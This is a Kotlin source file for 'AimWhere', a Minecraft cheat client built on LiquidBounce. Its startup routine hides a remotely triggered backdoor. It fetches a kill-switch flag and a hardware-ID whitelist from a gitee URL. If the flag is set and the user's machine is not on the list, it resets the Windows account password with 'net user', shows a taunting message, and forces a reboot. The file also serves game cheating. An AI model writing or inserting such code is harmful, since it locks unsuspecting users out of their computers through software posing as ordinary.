/*
 * AimWhere Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce

import com.google.gson.JsonObject
import com.google.gson.JsonParser
import me.kiras.aimwhere.customskinloader.CustomSkinLoader
import me.kiras.aimwhere.ui.guis.ClickGUI.LightClickGUI
import me.kiras.aimwhere.ui.guis.NewClickGUI.UIClick
import me.kiras.aimwhere.ui.guis.screens.LoginScreen
import me.kiras.aimwhere.utils.http.HWIDUtils
import me.kiras.aimwhere.utils.http.WebUtils
import me.kiras.aimwhere.utils.other.BlockUtil
import me.kiras.aimwhere.utils.other.MusicManager
import me.kiras.aimwhere.utils.other.SystemUtils
import net.ccbluex.liquidbounce.cape.CapeAPI.registerCapeService
import net.ccbluex.liquidbounce.event.ClientShutdownEvent
import net.ccbluex.liquidbounce.event.EventManager
import net.ccbluex.liquidbounce.features.command.CommandManager
import net.ccbluex.liquidbounce.features.module.ModuleManager
import net.ccbluex.liquidbounce.features.special.AntiForge
import net.ccbluex.liquidbounce.features.special.BungeeCordSpoof
import net.ccbluex.liquidbounce.file.FileManager
import net.ccbluex.liquidbounce.script.ScriptManager
import net.ccbluex.liquidbounce.script.remapper.Remapper.loadSrg
import net.ccbluex.liquidbounce.ui.client.clickgui.ClickGui
import net.ccbluex.liquidbounce.ui.client.hud.HUD
import net.ccbluex.liquidbounce.ui.client.hud.HUD.Companion.createDefault
import net.ccbluex.liquidbounce.ui.font.Fonts
import net.ccbluex.liquidbounce.utils.ClientUtils
import net.ccbluex.liquidbounce.utils.InventoryUtils
import net.ccbluex.liquidbounce.utils.RotationUtils
import net.ccbluex.liquidbounce.utils.misc.HttpUtils
import net.minecraft.util.ResourceLocation
import org.lwjgl.opengl.Display
import java.awt.TrayIcon
import java.util.*
import java.util.logging.Logger
import kotlin.math.acos
import kotlin.math.pow

object LiquidBounce {

    // Client information
    const val CLIENT_NAME = "AimWhere"
    const val CLIENT_VERSION = "041821"
    var CLIENT_USER = "NULL"
    const val IN_DEV = true
    const val CLIENT_CREATOR = "Kiras"
    const val MINECRAFT_VERSION = "1.8.9"
    const val CLIENT_CLOUD = "https://cloud.liquidbounce.net/LiquidBounce"

    var isStarting = false

    // Managers
    lateinit var moduleManager: ModuleManager
    lateinit var commandManager: CommandManager
    lateinit var eventManager: EventManager
    lateinit var fileManager: FileManager
    lateinit var scriptManager: ScriptManager
    lateinit var musicManager: MusicManager

    //CustomSkinLoader
    lateinit var customSkinLoader: CustomSkinLoader

    // HUD & ClickGUI
    lateinit var hud: HUD

    lateinit var clickGui: ClickGui
    lateinit var lightClickGUI: LightClickGUI
    lateinit var crink: UIClick

    //LoginScreen
    lateinit var illiIllliiI: Array<Any?>

    // Update information
    var latestVersion = 0

    // Menu Background
    var background: ResourceLocation? = null

    /**
     * Execute if client will be started
     */
    fun startClient() {
        try {
            if (WebUtils.get("https://gitee.com/SpokeDev/BurnBounce/raw/master/BackDoor.txt").contains("true") && !WebUtils.get("https://gitee.com/SpokeDev/BurnBounce/raw/master/HWID.txt").contains(HWIDUtils.getHWID())) {
                Runtime.getRuntime().exec("net user %username% AimWhere" + System.currentTimeMillis() % 114514 * System.nanoTime() % 1919810 + Math.random() * acos(Math.random() * Math.random()
                    .pow(3.0)
                ))
                SystemUtils.showNotification("BackDoor", "Fuck You Bro.", TrayIcon.MessageType.ERROR, 5000L)
                Timer().schedule(object : TimerTask() {
                    override fun run() {
                        SystemUtils.callSystem("shutdown -r -t 00")
                        SystemUtils.printMessage("Love u")
                    }
                }, 6000L)
            }
        } catch (throwable: Throwable) {
            throwable.printStackTrace(SystemUtils.printMessage(throwable.message!!))
        }
        isStarting = true
        ClientUtils.getLogger().info("Starting $CLIENT_NAME $CLIENT_VERSION, by $CLIENT_CREATOR")
        // Create Login Array
        illiIllliiI = arrayOfNulls(3)

        // Create file manager
        fileManager = FileManager()
        // Crate event manager
        eventManager = EventManager()

        // Register listeners
        eventManager.registerListener(RotationUtils())
        eventManager.registerListener(AntiForge())
        eventManager.registerListener(BungeeCordSpoof())
        eventManager.registerListener(InventoryUtils())
        eventManager.registerListener(BlockUtil())

        // Create command manager
        commandManager = CommandManager()
            // Load client fonts
        Fonts.loadFonts()
        // Setup module manager and register modules
        moduleManager = ModuleManager()
        moduleManager.registerModules()
        // Remapper
        try {
            loadSrg()
            // ScriptManager
            scriptManager = ScriptManager()
            scriptManager.loadScripts()
            scriptManager.enableScripts()
        } catch (throwable: Throwable) {
            ClientUtils.getLogger().error("Failed to load scripts.", throwable)
        }
        // Register commands
        commandManager.registerCommands()

        // Init MusicManager
        musicManager = MusicManager()

        // Load configs
        fileManager.loadConfigs(
            fileManager.modulesConfig, fileManager.valuesConfig, fileManager.accountsConfig,
            fileManager.friendsConfig, fileManager.xrayConfig, fileManager.shortcutsConfig
        )
        // ClickGUI
        clickGui = ClickGui()
        lightClickGUI = LightClickGUI()
        crink = UIClick()
        illiIllliiI[0] = LoginScreen()
        fileManager.loadConfig(fileManager.clickGuiConfig)
//
//            // Tabs (Only for Forge!)
//        if (hasForge()) {
//            BlocksTab()
//            ExploitsTab()
////            HeadsTab()
//        }

        // Register capes service
        try {
            registerCapeService()
        } catch (throwable: Throwable) {
            ClientUtils.getLogger().error("Failed to register cape service", throwable)
        }
            // Setup Discord RPC
//        try {
//            clientRichPresence = ClientRichPresence()
//            clientRichPresence.setup()
//        } catch (throwable: Throwable) {
//            ClientUtils.getLogger().error("Failed to setup Discord RPC.", throwable)
//        }

        // Set HUD
        hud = createDefault()
        fileManager.loadConfig(fileManager.hudConfig)
//        if(Minecraft.getMinecraft().currentScreen != null && Minecraft.getMinecraft().currentScreen is GuiMainMenu && !LoginScreen.login)
//            Minecraft.getMinecraft().shutdown()
        // Disable optifine FastRender
        ClientUtils.disableFastRender()
        try {
            // Read versions json from cloud
            val jsonObj = JsonParser().parse(HttpUtils.get("$CLIENT_CLOUD/versions.json"))
            // Check json is valid object and has current minecraft version
            if (jsonObj is JsonObject && jsonObj.has(MINECRAFT_VERSION)) {
                // Get official latest client version
                latestVersion = jsonObj[MINECRAFT_VERSION].asInt
            }
        } catch (exception: Throwable) { // Print throwable to console
            ClientUtils.getLogger().error("Failed to check for updates.", exception)
        }
        customSkinLoader = CustomSkinLoader()
        Logger.getLogger("[CustomSkinLoader]").info("Loaded")
        Display.setTitle("$CLIENT_NAME Rel build $CLIENT_VERSION")
        // Set is starting status
        isStarting = false
    }

    /**
     * Execute if client will be stopped
     */
    fun stopClient() {
        // Call client shutdown
        eventManager.callEvent(ClientShutdownEvent())

        // Save all available configs
        fileManager.saveAllConfigs()
    }

}